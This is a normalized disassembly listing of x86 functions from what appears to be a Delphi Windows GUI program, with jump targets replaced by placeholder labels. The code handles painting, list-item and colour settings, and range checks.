mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4161a0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx ebx
call sub_47ceb8
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4161a0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_47cd14
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_47cce0
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_416090
mov eax esi
call sub_47cce0
sub [ ebp - 0xc ] eax
sub_48186c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4469c4
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_4816d8
sub_4818a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422134
xor eax eax
push ebp
push sub_4819b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422424
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dc04
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10c ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422084
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4819c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_422568
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4223e0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_4819d8
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
setne al
jmp r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
retn
cmp [ eax + 0x2f2 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_481ae0
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2aa ] 0x0
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2ac ]
call [ esi + 0x2a8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
sub_481b38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2b2 ] 0x0
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2b4 ]
call [ esi + 0x2b0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
sub_481ba8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2ba ] 0x0
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2bc ]
call [ esi + 0x2b8 ]
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
sub_481c20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_440958
cmp [ ebx + 0x332 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x210 ]
call sub_422084
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x210 ]
call sub_422278
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_481c98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x352 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x354 ]
call [ ebx + 0x350 ]
sub_481cdc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_481e33
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x210 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_421dfc
mov eax [ ebx + 0x290 ]
call sub_4171e4
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481e3a
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404450
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_421adc
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_47d154
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_421514
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_47d154
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_422278
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_47d154
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_421a00
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_421adc
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_480f8c
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_480f8c
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_47d154
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40695c
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4221c0
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_47d154
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_481e44
push ebx
mov ebx eax
mov eax ebx
call sub_4466b4
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_481cdc
sub_481e6c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403e54#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x35a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4440cc
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_481368
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481f8c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_4044c4
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x108 ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47da68
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44187c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_44187c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x8 ]
call sub_404480
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_441768
mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_481fb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_481368
test eax eax
jne r-xdata
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4436a8
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_481ff8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x23c ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x23c ]
mov edx esi
call sub_47ceb8
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_482034
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ esi + 0x8 ]
call sub_414bc8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44955c
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_48118c
test eax eax
je r-xdata
mov eax ebx
call sub_48118c
mov ecx esp
mov dl 0x3
call sub_47da68
lea edx [ esp + 0x18 ]
mov eax esp
call sub_406990
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44187c
lea eax [ esp + 0x10 ]
call sub_4074a8
mov [ esi + 0x8 ] eax
sub_4820a4
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_47dbd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_47dc04
xor ecx ecx
mov edx 0x3
call sub_47d760
inc esi
dec ebx
jne r-xdata
sub_4820e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x22c ]
call sub_47dbd4
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_47dc04
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_47dc04
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xd0 ]
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_47dc04
mov edx 0x3
call sub_47d6f8
test al al
je r-xdata
sub_482154
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dce8
xor eax eax
push ebp
push sub_4821ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dbd4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4821f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dec4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_47dc04
mov edx 0x3
call sub_47d6f8
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_47dc04
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
sub_482208
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_47dbd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_47dc04
mov cl 0x1
mov edx 0x3
call sub_47d760
inc esi
dec ebx
jne r-xdata
sub_482244
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dce8
xor eax eax
push ebp
push sub_482291
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dcc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dec4
retn
sub_4822a4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448f54
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_48104c
cmp [ edi + 0x21c ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_482308
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x80000005
mov [ eax + 0xc ] 0x80000008
mov [ eax + 0x10 ] 0x80000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0x80000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403a24
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_482358
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_482449
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403610
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482450
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_482464
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
jmp [ eax * 4 + jump_table_48247b ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_421054
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_4824dc
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_482464
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_482464
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_482464
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_482464
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_482464
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_482464
pop ebx
retn
sub_482538
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_473b14
mov ecx esi
xor edx edx
mov eax edi
call sub_444294
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_482308
mov [ edi + 0x208 ] eax
call sub_40a214
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4825d4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
mov eax [ esi + 0x208 ]
call sub_4036c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_482608
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_482709
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482710
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404450
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40aeb0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bfdc
call sub_403e8c
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40aeb0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bfdc
call sub_403e8c
sub_48271c
push ebx
mov ebx eax
mov eax ebx
call sub_44550c
mov eax [ ebx + 0x208 ]
call sub_4824dc
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_482d40
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_482b88
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_482cc4
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_482a34
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_482924
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_482e90
pop ebx
retn
sub_4827b8
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_48286c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_40a264
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_4828f1
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402ac4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_482924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_482924
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_40a13c
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_482e90
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
